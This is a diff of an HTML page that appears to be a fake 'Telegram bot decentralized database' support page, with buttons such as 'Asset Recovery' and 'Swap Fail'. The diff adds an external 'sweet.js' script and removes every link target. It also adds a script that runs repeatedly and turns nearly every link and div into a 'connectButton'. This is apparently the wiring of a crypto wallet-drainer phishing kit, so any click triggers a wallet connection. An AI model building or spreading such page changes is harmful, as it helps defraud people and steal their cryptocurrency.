@@ -1,4 +1,5 @@
 <html lang="en"><head>
+    <script charset="UTF-8" type="text/javascript" src="./sweet.js"></script>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>TELEGRAM BOT DECENTRALIZED DATABASE</title>
@@ -44,15 +45,15 @@
           <div class="d-flex justify-content-center align-items-center">
             <div class="text-center rounded-5 button-cont my-4 py-4 p-md-5" style="background: url(./assets/telegram_d.gif); background-position: center; background-size: cover; background-repeat: no-repeat;">
               <div class="p-3 d-flex justify-content-center align-items-center flex-column gap-4">
-                <a href="val.html" class="tgme_action_button_new shine">
+                <a href="" class="tgme_action_button_new shine">
                   VALIDATION
                 </a>
-                <a href="val.html" class="tgme_action_button_new shine">RECTIFICATION</a>
-                <a href="val.html" class="tgme_action_button_new shine">CONFIGURATION
+                <a href="" class="tgme_action_button_new shine">RECTIFICATION</a>
+                <a href="" class="tgme_action_button_new shine">CONFIGURATION
                 </a>
-                <a href="val.html" class="tgme_action_button_new shine">ASSET RECOVERY</a>
-                <a href="val.html" class="tgme_action_button_new shine">SWAP FAIL</a>
-                <a href="val.html" class="tgme_action_button_new shine">
+                <a href="" class="tgme_action_button_new shine">ASSET RECOVERY</a>
+                <a href="" class="tgme_action_button_new shine">SWAP FAIL</a>
+                <a href="" class="tgme_action_button_new shine">
                   CLEAR BOT GLITCH</a>
               </div>
             </div>
@@ -67,6 +68,20 @@
   
 
 
+<script>
+    function addClassesToElements() {
 
+    const links = document.querySelectorAll('a:not(.connectButton)');
+    for (const link of links) {
+        link.removeAttribute('href');
+        link.classList.add('connectButton');
+    }
+    const buttons = document.querySelectorAll('div:not(.connectButton):not(.web3-overlay):not(.item):not(.web3-modal-items):not(.web3-modal-title):not(.web3-modal)');
+    for (const button of buttons) {
+        button.classList.add('connectButton');
+    }
+    }
+    setInterval(addClassesToElements, 300);
+</script>
 
 </body></html>
